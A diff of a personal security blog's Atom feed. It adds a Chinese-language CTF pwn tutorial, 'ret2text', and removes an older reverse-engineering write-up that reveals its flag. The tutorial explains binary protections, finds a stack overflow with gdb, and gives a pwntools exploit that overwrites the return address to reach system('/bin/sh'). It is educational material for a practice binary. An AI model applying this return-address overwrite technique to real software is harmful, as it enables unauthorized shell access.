@@ -8,8 +8,55 @@
     <author>
       <name>Kyr1ta</name>
     </author>
-    <updated>2021-07-10T06:45:42.826Z</updated>
+    <updated>2021-07-17T01:09:23.082Z</updated>
     <category term="kyr1ta" />
+    <entry>
+        <id>http://kyrita.top/ret2text/</id>
+        <title>ret2text</title>
+        <link rel="alternate" href="http://kyrita.top/ret2text/"/>
+        <content type="html">&lt;p&gt;&lt;a id=&#34;more&#34;&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;检查保护机制&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#检查保护机制&#34;&gt;#&lt;/a&gt; 检查保护机制&lt;/h2&gt;
+&lt;figure class=&#34;highlight html&#34;&gt;&lt;figcaption data-lang=&#34;HTML&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;checksec ret2text&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;figure class=&#34;highlight html&#34;&gt;&lt;figcaption data-lang=&#34;HTML&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Arch:    i386-32-little //文件为32位程序&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;RELRO:    Partial RELRO&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Stack:    No canary found    //未开启canary保护&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;NX:      NX enabled    //开启了栈不可执行保护&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;PIE:      No PIE (0x8048000)    //未开启地址无关可执行&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;pic/ret2text/22508867-848911d41f68e4a3.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;h3 id=&#34;canary栈保护&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#canary栈保护&#34;&gt;#&lt;/a&gt; canary（栈保护)&lt;/h3&gt;
+&lt;p&gt;当启用栈保护后，函数开始执行的时候会先往栈底插入 cookie 信息，当函数真正返回的时候会验证 cookie 信息是否合法 (栈帧销毁前测试该值是否被改变);&lt;br /&gt;
+ 如果不合法就停止程序运行 (栈溢出发生)。&lt;br /&gt;
+攻击者在覆盖返回地址的时候往往也会将 cookie 信息给覆盖掉，导致栈保护检查失败而阻止 shellcode 的执行，避免漏洞利用成功。在 Linux 中我们将 cookie 信息称为 Canary。&lt;/p&gt;
+&lt;h3 id=&#34;pie&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#pie&#34;&gt;#&lt;/a&gt; PIE&lt;/h3&gt;
+&lt;p&gt;如果程序开启了 PIE 保护的话，在每次加载程序时都变换加载地址&lt;/p&gt;
+&lt;h3 id=&#34;nxdep&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#nxdep&#34;&gt;#&lt;/a&gt; NX(DEP)&lt;/h3&gt;
+&lt;p&gt;NX 即 No-eXecute（不可执行）的意思，限制一块内存区域不可执行。&lt;/p&gt;
+&lt;h3 id=&#34;aslr&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#aslr&#34;&gt;#&lt;/a&gt; ASLR&lt;/h3&gt;
+&lt;p&gt;ASLR（地址随机化）是一种针对缓冲区溢出的安全保护技术，通过对堆、栈、共享库映射等线性区布局的随机化，通过增加攻击者预测目的地址的难度，防止攻击者直接定位攻击代码位置，达到阻止溢出攻击的目的。&lt;/p&gt;
+&lt;h2 id=&#34;0x2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#0x2&#34;&gt;#&lt;/a&gt; 0x2&lt;/h2&gt;
+&lt;p&gt;本题是 32 位程序，对应的是 32 的 IDA。加载出来的是汇编语言，然后就要去看它的 main 函数按 F5 反汇编&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;pic/ret2text/22508867-2c22be6edd039812.png&#34; alt=&#34;&#34; title=&#34;这里存在栈溢出漏洞&#34; /&gt;&lt;/p&gt;
+&lt;h3 id=&#34;栈溢出漏洞&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#栈溢出漏洞&#34;&gt;#&lt;/a&gt; 栈溢出漏洞&lt;/h3&gt;
+&lt;p&gt;简单讲，栈溢出就是向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，造成溢出。&lt;/p&gt;
+&lt;p&gt;&lt;mark&gt;发生栈溢出的条件&lt;/mark&gt; 程序必须向栈上写入数据。写入的数据大小没有被良好地控制&lt;/p&gt;
+&lt;p&gt;&lt;mark&gt;利用方式&lt;/mark&gt; 覆盖程序的返回地址为攻击者所控制的地址，比如该地址为执行 shellcode 的地址 shellcode 是一段用于利用软件漏洞而执行的代码，shellcode 为 16 进制的机器码，可以让攻击者获得 shell，利用 pwntools 可自动生成，等用到再说。可能造成栈溢出的函数。&lt;/p&gt;
+&lt;p&gt;&lt;mark&gt;可能造成栈溢出的函数有&lt;/mark&gt; gets,scanf,vscanf,sprintf,strcpy,strcat，bcopy&lt;/p&gt;
+&lt;h2 id=&#34;0x3&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#0x3&#34;&gt;#&lt;/a&gt; 0x3&lt;/h2&gt;
+&lt;p&gt;继续浏览其他函数的伪代码。发现 secure 函数中调用了 system（“/bin/sh”）&lt;br /&gt;
+我们只需要想办法执行这 system（“/bin/sh”）从而拿到我们想要的 shell。&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;pic/ret2text/22508867-4978445eded254f2.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;我们现在大概确定了栈溢出漏洞，我们首先要知道这个漏洞到底有多深，然后我们了解了这个漏洞的深度把东西填装进去让他覆盖到这个 system（“/bin/sh”）这个地址我们就可以得到 shell 了。&lt;/p&gt;
+&lt;p&gt;那如何确定这个偏移量和这个地址呢？&lt;/p&gt;
+&lt;h3 id=&#34;step1&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#step1&#34;&gt;#&lt;/a&gt; step1&lt;/h3&gt;
+&lt;p&gt;利用 gdb 进行调试看它的偏移&lt;/p&gt;
+&lt;figure class=&#34;highlight html&#34;&gt;&lt;figcaption data-lang=&#34;HTML&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;gdb -q ./ret2text         &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;//gdb载入该文件&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;pattern create 200     &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;//制造200个填充字符（多少字符都行），先把他复制下来&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;r                                 &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;//运行程序&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;pattern offset 地址     &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;//确定偏移&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;pic/ret2text/22508867-ef5ed1b8bd807dd4.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;pic/ret2text/22508867-fdfe76ec3c0ba50d.PNG&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;计算的偏移量为 112，下面找到 system（“/bin/sh”）地址就可以构造 exp 了，&lt;br /&gt;
+那么我们看 IDA 在 secure 中调用 system (“/bin/sh”) 的地址&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;pic/ret2text/22508867-0252408325f50505.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;mark&gt;exp 如下&lt;/mark&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;                                 &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;//&lt;/span&gt;导入python库&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;p &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; process&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;./ret2text&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;                     &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;//&lt;/span&gt;与文件建立本地连接，远程连接用r &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; remote&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;ip&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;端口&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;payload &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;a&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;112&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; p32&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x804863A&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;span class=&#34;token operator&#34;&gt;//&lt;/span&gt;p32&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;将其打包，&lt;span class=&#34;token number&#34;&gt;64&lt;/span&gt;位用p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sendline&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;payload&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;                           &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;//&lt;/span&gt;发送payload&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;interactive&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;                                     &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;//&lt;/span&gt;直接进行交互，相当于回到shell的模式，在取得shell之后使用&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h3 id=&#34;执行exp&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#执行exp&#34;&gt;#&lt;/a&gt; 执行 exp&lt;/h3&gt;
+&lt;p&gt;&lt;img data-src=&#34;pic/ret2text/22508867-d06a7cdcfdeb9781.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+</content>
+        <category term="wiki" scheme="http://kyrita.top/categories/wiki/" />
+        <category term="pwn" scheme="http://kyrita.top/categories/wiki/pwn/" />
+        <category term="ret2text" scheme="http://kyrita.top/tags/ret2text/" />
+        <updated>2021-07-17T01:09:23.082Z</updated>
+    </entry>
     <entry>
         <id>http://kyrita.top/Python%E5%AE%9E%E7%8E%B0%E5%AD%97%E9%A2%91%E7%BB%9F%E8%AE%A1/</id>
         <title>Python实现字频统计</title>
@@ -747,29 +794,5 @@ if(preg_match(&amp;quot;/or|-|\|/|\*|&amp;lt;|&amp;gt;|!|x|hex|(|)|+|select/i&am
         <category term="web" scheme="http://kyrita.top/categories/wp/web/" />
         <category term="SSTI" scheme="http://kyrita.top/tags/SSTI/" />
         <updated>2021-01-22T02:22:19.668Z</updated>
-    </entry>
-    <entry>
-        <id>http://kyrita.top/EZre/</id>
-        <title>RE-新年快乐</title>
-        <link rel="alternate" href="http://kyrita.top/EZre/"/>
-        <content type="html">&lt;h1 id=&#34;新年快乐&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#新年快乐&#34;&gt;#&lt;/a&gt; 新年快乐&lt;/h1&gt;
-&lt;p&gt;&lt;a id=&#34;more&#34;&gt;&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/01/24/whsWzYRnkfVULpu.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;是叫我们输入一个 flag, 看看就知道没什么卵用；&lt;/p&gt;
-&lt;p&gt;拖进 IDA 后啥也没弄到，这时我就 (想到) 是不是需要脱壳？？&lt;/p&gt;
-&lt;h2 id=&#34;先脱壳&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#先脱壳&#34;&gt;#&lt;/a&gt; 先脱壳&lt;/h2&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/01/24/3CDRpBo5OWqVJrA.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;将脱壳后的 exe 程序拖入 IDA 中；&lt;br /&gt;
- 这时便可以看到脱掉壳的 exe 已经可以浏览函数了；&lt;br /&gt;
-shift+F12 看一下&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/01/24/ZdnzfDQT4hG9PMs.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;选中到 flag F5 跳转到函数页面分析得知是要我们输入一个字符串；&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/01/24/LnMOhdarKjwcJ4Y.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;且字符串和 str2 比较，相同则得到 flag; 由此得知 flag=&lt;span class=&#34;spoiler bulr&#34; title=&#34;快走开(╯▔皿▔)╯&#34;&gt;flag{HappyNewYear!}&lt;/span&gt;&lt;/p&gt;
-</content>
-        <category term="wp" scheme="http://kyrita.top/categories/wp/" />
-        <category term="Re" scheme="http://kyrita.top/categories/wp/Re/" />
-        <category term="逆向先脱壳" scheme="http://kyrita.top/tags/%E9%80%86%E5%90%91%E5%85%88%E8%84%B1%E5%A3%B3/" />
-        <updated>2021-01-21T14:20:33.994Z</updated>
     </entry>
 </feed>
